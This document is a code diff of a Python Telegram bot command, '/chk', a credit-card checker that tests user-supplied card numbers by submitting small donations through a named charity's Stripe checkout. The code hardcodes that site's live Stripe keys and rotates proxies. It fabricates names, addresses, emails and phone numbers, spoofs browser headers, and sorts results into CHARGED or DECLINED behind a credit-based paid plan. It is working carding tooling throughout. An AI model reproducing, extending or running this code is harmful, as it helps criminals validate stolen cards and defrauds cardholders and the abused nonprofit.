@@ -1,3 +1,14 @@
+"""
+chk.py — /chk Stripe 0$ checker (python-telegram-bot)
+Gate: onamissionkc.org  — 4-step real Stripe flow
+Original gate logic preserved 100%.  UI updated to Batamanchk style.
+
+Verdict:
+  CHARGED  → result in chat  +  DM to user
+  DECLINED → result in chat only
+  ERROR    → result in chat only, credit refunded
+"""
+
 import aiohttp
 import asyncio
 import time
@@ -9,179 +20,252 @@ import uuid
 from html import escape
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import CommandHandler, ContextTypes
-from config import get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS, SUPPORT_LINK, API_TIMEOUT
+from config import (
+    get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS, SUPPORT_LINK, API_TIMEOUT,
+    CHANNEL_LINK, DEV_LINK, BOT_NAME,
+    E_CARD, E_USER, E_TIME, E_DEV, E_PRO,
+    E_LIVE, E_DECLINED, E_ERRORS, E_PROGRESS, E_GATE,
+    get_plan_emoji_id, get_random_live_emoji, tg_emoji,
+    CARD_EMOJI_ID, TIME_EMOJI_ID, USER_EMOJI_ID, DEV_EMOJI_ID, PRO_EMOJI_ID,
+)
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# 🦇 ONAMISIONKC STRIPE API CONFIGURATION 🦇
+# 🦇 ONAMISIONKC STRIPE GATE CONFIGURATION
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-BASE_URL = "https://www.onamissionkc.org"
-FUND_ID = "6acfdbc6-2deb-42a5-bdf2-390f9ac5bc7b"
-WEBSITE_ID = "62fc11be71fa7a1da8ed62f8"
-STRIPE_PK = "pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e"
-STRIPE_ACCOUNT = "acct_1LwocDFHMGxIu0Ep"
-DONATION_AMOUNT_CENTS = 50  # $0.50
-GATE_NAME = "Sᴛʀɪᴘᴇ 0$ 💳 🟢"
+BASE_URL              = "https://www.onamissionkc.org"
+FUND_ID               = "6acfdbc6-2deb-42a5-bdf2-390f9ac5bc7b"
+WEBSITE_ID            = "62fc11be71fa7a1da8ed62f8"
+STRIPE_PK             = "pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e"
+STRIPE_ACCOUNT        = "acct_1LwocDFHMGxIu0Ep"
+DONATION_AMOUNT_CENTS = 50   # $0.50
+GATE_NAME             = "Sᴛʀɪᴘᴇ 0$ 💳"
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # LOCAL DATA & PROXY HELPERS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-FIRST_NAMES = ["James", "John", "Robert", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Elizabeth", "Susan", "Jessica", "Sarah", "Karen", "Daniel", "Matthew", "Anthony", "Mark", "Steven", "Andrew", "Joshua", "Kevin", "Brian", "Edward", "Christopher", "Ryan", "Nicholas", "Eric", "Jonathan", "Stephen", "Larry", "Justin", "Scott", "Brandon"]
-LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores"]
-EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com", "aol.com", "icloud.com"]
-US_CITIES = [("Fort Lauderdale", "FL", "33316"), ("Miami", "FL", "33101"), ("Orlando", "FL", "32801"), ("Tampa", "FL", "33601"), ("Jacksonville", "FL", "32099"), ("Houston", "TX", "77001"), ("Dallas", "TX", "75201"), ("Austin", "TX", "73301"), ("San Antonio", "TX", "78201"), ("Los Angeles", "CA", "90001"), ("San Diego", "CA", "92101"), ("San Francisco", "CA", "94102"), ("New York", "NY", "10001"), ("Chicago", "IL", "60601"), ("Phoenix", "AZ", "85001")]
-US_STREETS = ["1900 Southeast 15th Street", "1234 Main Street", "5678 Oak Avenue", "9012 Palm Boulevard", "3456 Maple Drive", "7890 Cedar Lane", "2345 Elm Street", "6789 Pine Road", "0123 Birch Court", "4567 Willow Way"]
+FIRST_NAMES = ["James","John","Robert","Michael","David","William","Richard",
+               "Joseph","Thomas","Charles","Mary","Patricia","Jennifer","Linda",
+               "Barbara","Elizabeth","Susan","Jessica","Sarah","Karen","Daniel",
+               "Matthew","Anthony","Mark","Steven","Andrew","Joshua","Kevin",
+               "Brian","Edward","Christopher","Ryan","Nicholas","Eric","Jonathan",
+               "Stephen","Larry","Justin","Scott","Brandon"]
+LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller",
+               "Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez",
+               "Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin",
+               "Lee","Perez","Thompson","White","Harris","Sanchez","Clark",
+               "Ramirez","Lewis","Robinson","Walker","Young","Allen","King",
+               "Wright","Scott","Torres","Nguyen","Hill","Flores"]
+EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com",
+                 "protonmail.com","aol.com","icloud.com"]
+US_CITIES = [
+    ("Fort Lauderdale","FL","33316"),("Miami","FL","33101"),
+    ("Orlando","FL","32801"),("Tampa","FL","33601"),("Jacksonville","FL","32099"),
+    ("Houston","TX","77001"),("Dallas","TX","75201"),("Austin","TX","73301"),
+    ("San Antonio","TX","78201"),("Los Angeles","CA","90001"),
+    ("San Diego","CA","92101"),("San Francisco","CA","94102"),
+    ("New York","NY","10001"),("Chicago","IL","60601"),("Phoenix","AZ","85001"),
+]
+US_STREETS = [
+    "1900 Southeast 15th Street","1234 Main Street","5678 Oak Avenue",
+    "9012 Palm Boulevard","3456 Maple Drive","7890 Cedar Lane",
+    "2345 Elm Street","6789 Pine Road","0123 Birch Court","4567 Willow Way",
+]
 
 def load_proxies():
     try:
-        with open("px.txt", "r") as f:
-            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
+        with open("px.txt") as f:
+            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
     except FileNotFoundError:
         return []
 
 PROXIES = load_proxies()
 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# LOCAL USER DATA HELPERS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def get_user_data(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> dict:
     uid = str(user_id)
-    if "user_data" not in context.bot_data: context.bot_data["user_data"] = {}
+    context.bot_data.setdefault("user_data", {})
     if uid not in context.bot_data["user_data"]:
-        context.bot_data["user_data"][uid] = {"name": "User", "credits": 150, "plan": "TRIAL", "expires": 0, "pre_premium_credits": 0}
+        context.bot_data["user_data"][uid] = {
+            "name": "User", "credits": 150, "plan": "TRIAL",
+            "expires": 0, "pre_premium_credits": 0,
+        }
     return context.bot_data["user_data"][uid]
 
 def is_user_premium(ud: dict) -> bool:
     raw_plan = ud.get("plan", "TRIAL").upper()
-    if raw_plan == "TRIAL": return False
+    if raw_plan == "TRIAL":
+        return False
     if ud.get("expires", 0) <= time.time():
-        ud["plan"] = "TRIAL"; ud["credits"] = ud.get("pre_premium_credits", 150); ud["expires"] = 0
+        ud["plan"]    = "TRIAL"
+        ud["credits"] = ud.get("pre_premium_credits", 150)
+        ud["expires"] = 0
         return False
     return True
 
-def get_styled_plan(raw_plan: str) -> str:
-    plan_upper = raw_plan.upper()
-    if plan_upper == "CORE": return "✨ Cᴏʀᴇ ✨"
-    elif plan_upper == "ELITE": return "⭐ Eʟɪᴛᴇ ⭐"
-    elif plan_upper == "ROOT": return "👑 Rᴏᴏᴛ 👑"
-    else: return "Tʀɪᴀʟ"
-
 async def _check_force_sub(user_id: int, context) -> list:
-    if user_id == OWNER_ID: return []
+    if user_id == OWNER_ID:
+        return []
     not_joined = []
     for name, link in FORCE_CHANNELS:
         try:
             member = await context.bot.get_chat_member(f"@{name}", user_id)
-            if member.status in ("left", "kicked"): not_joined.append((name, link))
-        except Exception: pass
+            if member.status in ("left", "kicked"):
+                not_joined.append((name, link))
+        except Exception:
+            pass
     return not_joined
 
-def get_desktop_headers(origin=None, referer=None, sec_site="none", sec_mode="navigate", sec_dest="document"):
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# BROWSER HEADERS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def get_desktop_headers(origin=None, referer=None,
+                        sec_site="none", sec_mode="navigate", sec_dest="document"):
     h = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 'cache-control': 'no-cache', 'pragma': 'no-cache', 'priority': 'u=0, i',
-        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""',
-        'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': sec_dest, 'sec-fetch-mode': sec_mode,
-        'sec-fetch-site': sec_site, 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1',
+        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'cache-control': 'no-cache', 'pragma': 'no-cache', 'priority': 'u=0, i',
+        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""',
+        'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"',
+        'sec-fetch-dest': sec_dest, 'sec-fetch-mode': sec_mode,
+        'sec-fetch-site': sec_site, 'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
     }
-    if origin: h['origin'] = origin
+    if origin:  h['origin']  = origin
     if referer: h['referer'] = referer
     return h
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# AUTOMATED API REQUEST FUNCTIONS
+# GATE STEPS  (original logic — unchanged)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def step0_get_crumb(session, proxy):
     headers = get_desktop_headers()
     async with session.get(f"{BASE_URL}/", headers=headers, proxy=proxy, timeout=20) as resp:
-        pass 
-    
+        pass
     cookies = session.cookie_jar.filter_cookies(BASE_URL)
-    crumb = cookies.get("crumb")
+    crumb   = cookies.get("crumb")
     return crumb.value if crumb else None
 
 async def step1_get_cart_token(session, proxy):
-    headers = get_desktop_headers(origin=BASE_URL, referer=f'{BASE_URL}/donate-now', sec_site='same-origin', sec_mode='cors', sec_dest='empty')
-    headers['accept'] = 'application/json, text/plain, */*'
+    headers = get_desktop_headers(
+        origin=BASE_URL, referer=f'{BASE_URL}/donate-now',
+        sec_site='same-origin', sec_mode='cors', sec_dest='empty'
+    )
+    headers['accept']       = 'application/json, text/plain, */*'
     headers['content-type'] = 'application/json'
-    del headers['upgrade-insecure-requests']; del headers['sec-fetch-user']
+    del headers['upgrade-insecure-requests']
+    del headers['sec-fetch-user']
 
-    payload = {'amount': {'value': DONATION_AMOUNT_CENTS, 'currencyCode': 'USD'}, 'donationFrequency': 'ONE_TIME', 'feeAmount': None}
-    
-    async with session.post(f"{BASE_URL}/api/v1/fund-service/websites/{WEBSITE_ID}/donations/funds/{FUND_ID}", headers=headers, json=payload, proxy=proxy, timeout=20) as resp:
+    payload = {
+        'amount': {'value': DONATION_AMOUNT_CENTS, 'currencyCode': 'USD'},
+        'donationFrequency': 'ONE_TIME', 'feeAmount': None,
+    }
+    async with session.post(
+        f"{BASE_URL}/api/v1/fund-service/websites/{WEBSITE_ID}/donations/funds/{FUND_ID}",
+        headers=headers, json=payload, proxy=proxy, timeout=20
+    ) as resp:
         data = await resp.json(content_type=None)
-        
+
     redirect = data.get("redirectUrlPath", "")
-    match = re.search(r'cartToken=([^&]+)', redirect)
+    match    = re.search(r'cartToken=([^&]+)', redirect)
     return match.group(1) if match else None
 
 async def step1b_get_xsrf_and_total(session, cart_token, proxy):
-    headers = get_desktop_headers(referer=f'{BASE_URL}/donate-now', sec_site='same-origin', sec_mode='navigate', sec_dest='document')
-    async with session.get(f"{BASE_URL}/checkout?cartToken={cart_token}", headers=headers, proxy=proxy, timeout=20) as resp:
+    headers = get_desktop_headers(
+        referer=f'{BASE_URL}/donate-now',
+        sec_site='same-origin', sec_mode='navigate', sec_dest='document'
+    )
+    async with session.get(
+        f"{BASE_URL}/checkout?cartToken={cart_token}",
+        headers=headers, proxy=proxy, timeout=20
+    ) as resp:
         html = await resp.text()
 
-    xsrf = None
-    match = re.search(r'"xsrfToken"\s*:\s*"([^"]+)"', html)
-    if match: xsrf = match.group(1)
-        
-    grand_total = None
-    match = re.search(r'"grandTotal"\s*:\s*{[^}]*"decimalValue"\s*:\s*"([^"]+)"', html)
-    if match: grand_total = match.group(1)
-
+    xsrf = grand_total = None
+    m = re.search(r'"xsrfToken"\s*:\s*"([^"]+)"', html)
+    if m: xsrf = m.group(1)
+    m = re.search(r'"grandTotal"\s*:\s*{[^}]*"decimalValue"\s*:\s*"([^"]+)"', html)
+    if m: grand_total = m.group(1)
     return xsrf, grand_total
 
 async def step2_create_pm(session, card_data, full_name, email, address_info, proxy):
     headers = {
-        'accept': 'application/json', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 'cache-control': 'no-cache',
-        'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'pragma': 'no-cache',
-        'priority': 'u=1, i', 'referer': 'https://js.stripe.com/', 'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
-        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site',
+        'accept': 'application/json', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'cache-control': 'no-cache', 'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com', 'pragma': 'no-cache', 'priority': 'u=1, i',
+        'referer': 'https://js.stripe.com/',
+        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
     }
 
-    cn = card_data["card_number"]
+    cn     = card_data["card_number"]
     cn_fmt = ' '.join([cn[i:i+4] for i in range(0, len(cn), 4)])
     street, city, state, zip_code = address_info
 
     guid = str(uuid.uuid4()).replace('-', '') + '10e650'
     muid = str(uuid.uuid4())
-    sid = str(uuid.uuid4())
+    sid  = str(uuid.uuid4())
     csid = str(uuid.uuid4())
     esid = f"elements_session_{''.join(random.choices(string.ascii_letters + string.digits, k=12))}"
     ecid = str(uuid.uuid4())
 
     data = {
-        'billing_details[address][city]': city, 'billing_details[address][country]': 'US',
-        'billing_details[address][line1]': street, 'billing_details[address][line2]': '',
-        'billing_details[address][postal_code]': zip_code, 'billing_details[address][state]': state,
-        'billing_details[name]': full_name, 'billing_details[email]': email, 'type': 'card',
-        'card[number]': cn_fmt, 'card[cvc]': card_data['cvv'], 'card[exp_year]': card_data['year'], 'card[exp_month]': card_data['month'],
-        'allow_redisplay': 'unspecified', 'payment_user_agent': 'stripe.js/39914d4bef; stripe-js-v3/39914d4bef; payment-element; deferred-intent',
-        'referrer': BASE_URL, 'time_on_page': str(random.randint(200000, 500000)),
-        'client_attribution_metadata[client_session_id]': csid, 'client_attribution_metadata[merchant_integration_source]': 'elements',
-        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element', 'client_attribution_metadata[merchant_integration_version]': '2021',
-        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred', 'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
-        'client_attribution_metadata[elements_session_id]': esid, 'client_attribution_metadata[elements_session_config_id]': ecid,
-        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment', 'guid': guid, 'muid': muid, 'sid': sid,
+        'billing_details[address][city]':        city,
+        'billing_details[address][country]':     'US',
+        'billing_details[address][line1]':       street,
+        'billing_details[address][line2]':       '',
+        'billing_details[address][postal_code]': zip_code,
+        'billing_details[address][state]':       state,
+        'billing_details[name]':                 full_name,
+        'billing_details[email]':                email,
+        'type':                                  'card',
+        'card[number]':     cn_fmt,
+        'card[cvc]':        card_data['cvv'],
+        'card[exp_year]':   card_data['year'],
+        'card[exp_month]':  card_data['month'],
+        'allow_redisplay':  'unspecified',
+        'payment_user_agent': 'stripe.js/39914d4bef; stripe-js-v3/39914d4bef; payment-element; deferred-intent',
+        'referrer': BASE_URL,
+        'time_on_page': str(random.randint(200000, 500000)),
+        'client_attribution_metadata[client_session_id]':                csid,
+        'client_attribution_metadata[merchant_integration_source]':      'elements',
+        'client_attribution_metadata[merchant_integration_subtype]':     'payment-element',
+        'client_attribution_metadata[merchant_integration_version]':     '2021',
+        'client_attribution_metadata[payment_intent_creation_flow]':     'deferred',
+        'client_attribution_metadata[payment_method_selection_flow]':    'merchant_specified',
+        'client_attribution_metadata[elements_session_id]':              esid,
+        'client_attribution_metadata[elements_session_config_id]':       ecid,
+        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
+        'guid': guid, 'muid': muid, 'sid': sid,
         'key': STRIPE_PK, '_stripe_account': STRIPE_ACCOUNT,
     }
 
-    async with session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxy=proxy, timeout=20) as resp:
+    async with session.post(
+        'https://api.stripe.com/v1/payment_methods',
+        headers=headers, data=data, proxy=proxy, timeout=20
+    ) as resp:
         rj = await resp.json(content_type=None)
 
     if "error" in rj:
-        err = rj["error"]
+        err  = rj["error"]
         code = err.get("code", "unknown")
-        msg = err.get("message", "Unknown error")
-        dc = err.get("decline_code", "")
-
+        msg  = err.get("message", "Unknown error")
+        dc   = err.get("decline_code", "")
         if code == "card_declined":
             return None, f"DECLINED | {dc.upper() if dc else 'CARD_DECLINED'} - {msg}"
-        elif code == "incorrect_number": return None, "ERROR | INVALID_CARD_NUMBER"
+        elif code == "incorrect_number":    return None, "ERROR | INVALID_CARD_NUMBER"
         elif code == "invalid_expiry_year": return None, "ERROR | INVALID_EXPIRY_YEAR"
-        elif code == "invalid_expiry_month": return None, "ERROR | INVALID_EXPIRY_MONTH"
-        elif code == "invalid_cvc": return None, "ERROR | INVALID_CVV"
-        elif code == "expired_card": return None, f"DECLINED | EXPIRED_CARD - {msg}"
-        elif code == "incorrect_cvc": return None, "ERROR | INVALID_CVV"
-        elif code == "processing_error": return None, "ERROR | PROCESSING_ERROR"
-        elif code == "incorrect_zip": return None, "DECLINED | ZIP_MISMATCH"
+        elif code == "invalid_expiry_month":return None, "ERROR | INVALID_EXPIRY_MONTH"
+        elif code == "invalid_cvc":         return None, "ERROR | INVALID_CVV"
+        elif code == "expired_card":        return None, f"DECLINED | EXPIRED_CARD - {msg}"
+        elif code == "incorrect_cvc":       return None, "ERROR | INVALID_CVV"
+        elif code == "processing_error":    return None, "ERROR | PROCESSING_ERROR"
+        elif code == "incorrect_zip":       return None, "DECLINED | ZIP_MISMATCH"
         else:
             if "declin" in msg.lower(): return None, f"DECLINED | {msg.upper()}"
             return None, f"ERROR | {code.upper()}: {msg}"
@@ -191,112 +275,181 @@ async def step2_create_pm(session, card_data, full_name, email, address_info, pr
         return None, "ERROR | TOKENIZATION_FAILED"
     return {"id": pm_id}, None
 
-async def step3_submit(session, cart_token, pm, full_name, email, crumb, xsrf, address_info, grand_total, proxy):
+async def step3_submit(session, cart_token, pm, full_name, email,
+                       crumb, xsrf, address_info, grand_total, proxy):
     headers = {
-        'accept': 'application/json, text/plain, */*', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 'cache-control': 'no-cache',
-        'content-type': 'application/json', 'origin': BASE_URL, 'pragma': 'no-cache', 'referer': f'{BASE_URL}/checkout?cartToken={cart_token}',
-        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""',
-        'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin',
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'cache-control': 'no-cache', 'content-type': 'application/json',
+        'origin': BASE_URL, 'pragma': 'no-cache',
+        'referer': f'{BASE_URL}/checkout?cartToken={cart_token}',
+        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""',
+        'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"',
+        'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
         'x-csrf-token': crumb, 'x-siteuser-xsrf-token': xsrf,
     }
 
-    fn = full_name.split()[0] if ' ' in full_name else full_name
-    ln = ' '.join(full_name.split()[1:]) if ' ' in full_name else ''
+    fn     = full_name.split()[0] if ' ' in full_name else full_name
+    ln     = ' '.join(full_name.split()[1:]) if ' ' in full_name else ''
     street, city, state, zip_code = address_info
-    phone = f"{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
+    phone  = f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
 
     payload = {
-        'email': email, 'subscribeToList': False, 'shippingAddress': {'id': '', 'firstName': '', 'lastName': '', 'line1': '', 'line2': '', 'city': city, 'region': state, 'postalCode': '', 'country': '', 'phoneNumber': ''},
-        'createNewUser': False, 'newUserPassword': None, 'saveShippingAddress': False, 'makeDefaultShippingAddress': False, 'customFormData': None, 'shippingAddressId': None,
-        'proposedAmountDue': {'decimalValue': grand_total, 'currencyCode': 'USD'}, 'cartToken': cart_token,
-        'paymentToken': {'stripePaymentTokenType': 'PAYMENT_METHOD_ID', 'token': pm['id'], 'type': 'STRIPE'},
+        'email': email, 'subscribeToList': False,
+        'shippingAddress': {
+            'id':'','firstName':'','lastName':'','line1':'','line2':'',
+            'city':city,'region':state,'postalCode':'','country':'','phoneNumber':'',
+        },
+        'createNewUser': False, 'newUserPassword': None, 'saveShippingAddress': False,
+        'makeDefaultShippingAddress': False, 'customFormData': None, 'shippingAddressId': None,
+        'proposedAmountDue': {'decimalValue': grand_total, 'currencyCode': 'USD'},
+        'cartToken': cart_token,
+        'paymentToken': {
+            'stripePaymentTokenType': 'PAYMENT_METHOD_ID',
+            'token': pm['id'], 'type': 'STRIPE',
+        },
         'reCaptchaToken': None, 'billToShippingAddress': False,
-        'billingAddress': {'id': '', 'firstName': fn, 'lastName': ln, 'line1': street, 'line2': '', 'city': city, 'region': state, 'postalCode': zip_code, 'country': 'US', 'phoneNumber': phone},
-        'savePaymentInfo': False, 'makeDefaultPayment': False, 'paymentCardId': None, 'universalPaymentElementEnabled': True,
+        'billingAddress': {
+            'id':'','firstName':fn,'lastName':ln,'line1':street,'line2':'',
+            'city':city,'region':state,'postalCode':zip_code,'country':'US','phoneNumber':phone,
+        },
+        'savePaymentInfo': False, 'makeDefaultPayment': False,
+        'paymentCardId': None, 'universalPaymentElementEnabled': True,
     }
 
-    async with session.post(f"{BASE_URL}/api/2/commerce/orders", headers=headers, json=payload, proxy=proxy, timeout=30) as resp:
-        try: 
+    async with session.post(
+        f"{BASE_URL}/api/2/commerce/orders",
+        headers=headers, json=payload, proxy=proxy, timeout=30
+    ) as resp:
+        try:
             rj = await resp.json(content_type=None)
-        except: 
+        except Exception:
             return "ERROR", "Invalid JSON response from API"
 
-    # ── EXACT REAL RESPONSE PARSING ──
-    raw_json_str = json.dumps(rj) # Convert the exact API response to a string to show in the bot
     ss = rj.get("submissionStatus", "").upper()
     ft = rj.get("failureType", "")
 
+    # ── Build a clean human-readable response string ──────────────
     if ss == "ORDER_CONFIRMED":
-        return "CHARGED", raw_json_str
+        order_id = rj.get("orderId") or rj.get("orderNumber") or "N/A"
+        raw_resp = f"ORDER_CONFIRMED | Order #{order_id}"
+        return "CHARGED", raw_resp
     elif ft:
-        return "DECLINED", raw_json_str
+        ft_clean = str(ft).replace("_", " ").title()
+        raw_resp = f"DECLINED | {ft_clean}"
+        return "DECLINED", raw_resp
     else:
-        return "DECLINED", raw_json_str
+        msg = rj.get("message") or rj.get("errorMessage") or ss or "Unknown"
+        raw_resp = f"DECLINED | {msg}"
+        return "DECLINED", raw_resp
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # /chk COMMAND HANDLER
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    uid  = user.id
 
-    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
+    # ── Gate checks ─────────────────────────────────────────────────
+    if context.bot_data.get("maintenance") and uid != OWNER_ID:
         await update.message.reply_text("⚠️ Bot is under maintenance. Try again later.")
         return
     if not context.bot_data.get("chk_on", True):
-        await update.message.reply_text("⚠️ Sᴛʀɪᴘᴇ gate is currently <b>OFF</b>.", parse_mode="HTML")
+        await update.message.reply_text(
+            f"{E_ERRORS} <b>Sᴛʀɪᴘᴇ gate is currently OFF.</b>",
+            parse_mode="HTML"
+        )
         return
 
-    not_joined = await _check_force_sub(user.id, context)
+    not_joined = await _check_force_sub(uid, context)
     if not_joined:
         rows = [[InlineKeyboardButton(f"➺ Join @{n}", url=l)] for n, l in not_joined]
-        rows.append([InlineKeyboardButton("✅ I Joined — Verify Now", callback_data="check_sub")])
-        await update.message.reply_text("<b>[ 𖥷iТ ] ➺ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ</b>\n━━━━━━━━━━━━━━━━━\nJoin our channel & group to use this bot.\n━━━━━━━━━━━━━━━━━", reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")
+        rows.append([InlineKeyboardButton("✅  I Joined All — Verify Now", callback_data="check_sub")])
+        await update.message.reply_text(
+            "<b>[ 𖥷iТ ] ➺ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ</b>\n━━━━━━━━━━━━━━━━━\n"
+            "Join our channel & group to use this bot.\n━━━━━━━━━━━━━━━━━",
+            reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML"
+        )
         return
 
-    # ── Parse card (FIXED EXTRACTION) ──
+    # ── Parse card ───────────────────────────────────────────────────
     card_str = None
     if context.args:
         card_str = context.args[0].strip()
     elif update.message.reply_to_message:
-        replied_msg = update.message.reply_to_message
-        replied_text = replied_msg.text or replied_msg.caption or ""
-        match = re.search(r'(\d{13,19})\s*[|,;\s]\s*(\d{1,2})\s*[|,;\s]\s*(\d{2,4})\s*[|,;\s]\s*(\d{3,4})', replied_text)
-        if match:
-            card_str = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
+        replied_text = (update.message.reply_to_message.text or
+                        update.message.reply_to_message.caption or "")
+        m = re.search(
+            r'(\d{13,19})\s*[|,;\s]\s*(\d{1,2})\s*[|,;\s]\s*(\d{2,4})\s*[|,;\s]\s*(\d{3,4})',
+            replied_text
+        )
+        if m:
+            card_str = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
         else:
-            match = re.search(r'\b(\d{13,19})\b', replied_text)
-            if match: card_str = match.group(1)
+            m = re.search(r'\b(\d{13,19})\b', replied_text)
+            if m: card_str = m.group(1)
 
     if not card_str:
-        await update.message.reply_text("⚠️ <b>Uꜱᴀɢᴇ:</b>\n<code>/chk cc|mm|yy|cvv</code>\n\n<b>Example:</b>\n<code>/chk 4111111111111111|12|26|123</code>", parse_mode="HTML")
+        await update.message.reply_text(
+            f"{E_GATE} <b>{GATE_NAME}</b>\n──────────\n"
+            f"<b>Usage:</b> <code>/chk cc|mm|yy|cvv</code>\n"
